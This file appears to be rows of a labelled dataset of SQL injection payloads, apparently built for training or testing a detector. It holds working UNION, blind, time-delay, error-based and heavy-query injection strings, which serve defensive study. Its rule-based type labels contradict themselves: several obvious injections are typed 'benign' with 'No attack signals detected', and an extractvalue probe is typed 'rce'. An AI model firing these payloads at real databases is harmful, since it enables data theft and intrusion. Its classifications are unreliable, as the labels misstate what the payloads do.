row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
7210,( select ( case when ( 6986 = 6986 ) then 6986 else 6986* ( select 6986 from mysql.db ) end ) ),1,,benign,generic,0.8,No attack signals detected in payload,rule-based
7211,"1 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) -- kegk",1,,time_blind,sqlite,0.95,randomblob ( is SQLite-specific time-delay function — time-based blind inference (priority 5),rule-based
7212,"-9583' ) ) union all select 6392,6392,6392,6392,6392,6392,6392,6392,6392,6392#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
7213,1%' ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( '%' = ',1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
7214,1%' and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
7215,"-5391 or make_set ( 9354 = 9354,7185 ) # ptyy",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
7216,"-5322"" union all select 6494,6494,6494,6494,6494,6494--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
7217,select sleep ( 5 ) and ( ( ( 8354 = 8354,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
7218,"1 and elt ( 4249 = 4249,7259 ) -- meef",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
7219,1' in boolean mode ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) #,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
7220,"1"" ) as ypfa where 6128 = 6128",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
7221,1'+ ( select plhk where 6540 = 6540,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
7222,"-3102 ) union all select 6707,6707,6707,6707--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
7223,"1 and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) # dwxl",1,,error_based,generic,0.95,convert ( int detected — error_based injection (priority 4) on generic,rule-based
7224,"-9634' ) ) ) union all select 4141,4141#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
7225,"-5640"" ) ) or 9792 = 2728--",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
7226,"1' procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and 'ctac' like 'ctac",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
7227,-5764 or 3038 = 3038,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
7228,select ( case when ( 4996 = 1734 ) then 1 else 4996* ( select 4996 from master..sysdatabases ) end ) --,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
7229,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ""snwx"" like ""snwx",1,,heavy_query,generic,0.95,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users detected — heavy_query injection (priority 6) on generic",rule-based
